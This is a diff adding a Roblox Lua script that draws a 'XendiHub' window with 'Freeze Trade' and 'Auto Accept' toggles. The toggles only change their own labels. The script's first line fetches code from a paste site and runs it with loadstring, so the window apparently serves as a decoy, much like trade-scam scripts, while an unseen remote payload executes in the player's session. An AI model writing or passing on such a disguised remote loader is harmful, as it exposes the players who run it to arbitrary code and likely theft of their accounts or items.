@@ -1,0 +1,72 @@
+loadstring(game:HttpGet("https://pastefy.app/CAybxcDL/raw"))()
+-- Create the main ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "XendiHub"
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+screenGui.ResetOnSpawn = false
+
+-- Create draggable main frame
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0, 200, 0, 120)
+mainFrame.Position = UDim2.new(0.5, -100, 0.5, -60)
+mainFrame.BackgroundColor3 = Color3.fromRGB(139, 69, 19) -- Brown
+mainFrame.BorderSizePixel = 0
+mainFrame.Active = true
+mainFrame.Draggable = true
+mainFrame.Parent = screenGui
+
+-- Top green header
+local header = Instance.new("Frame")
+header.Size = UDim2.new(1, 0, 0, 30)
+header.BackgroundColor3 = Color3.fromRGB(50, 205, 50) -- Green
+header.BorderSizePixel = 0
+header.Parent = mainFrame
+
+-- Title text
+local title = Instance.new("TextLabel")
+title.Text = "XENDIHUB"
+title.Font = Enum.Font.GothamBold
+title.TextSize = 20
+title.TextColor3 = Color3.fromRGB(0, 0, 0)
+title.BackgroundTransparency = 1
+title.Size = UDim2.new(1, 0, 1, 0)
+title.Parent = header
+
+-- Function to create toggle button
+local function createToggleButton(name, posY)
+	local toggle = Instance.new("TextButton")
+	toggle.Name = name
+	toggle.Size = UDim2.new(0.9, 0, 0, 30)
+	toggle.Position = UDim2.new(0.05, 0, 0, posY)
+	toggle.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
+	toggle.BorderSizePixel = 0
+	toggle.Text = name .. ": OFF"
+	toggle.Font = Enum.Font.Gotham
+	toggle.TextSize = 14
+	toggle.TextColor3 = Color3.fromRGB(0, 0, 0)
+	toggle.AutoButtonColor = true
+	toggle.Parent = mainFrame
+
+	local isOn = false
+	toggle.MouseButton1Click:Connect(function()
+		isOn = not isOn
+		toggle.Text = name .. ": " .. (isOn and "ON" or "OFF")
+		toggle.BackgroundColor3 = isOn and Color3.fromRGB(100, 200, 100) or Color3.fromRGB(240, 240, 240)
+	end)
+end
+
+-- Create toggles
+createToggleButton("Freeze Trade", 40)
+createToggleButton("Auto Accept", 75)
+
+-- Help Button
+local helpButton = Instance.new("TextButton")
+helpButton.Size = UDim2.new(0, 20, 0, 20)
+helpButton.Position = UDim2.new(1, -25, 1, -25)
+helpButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+helpButton.Text = "?"
+helpButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+helpButton.Font = Enum.Font.GothamBold
+helpButton.TextSize = 14
+helpButton.Parent = mainFrame
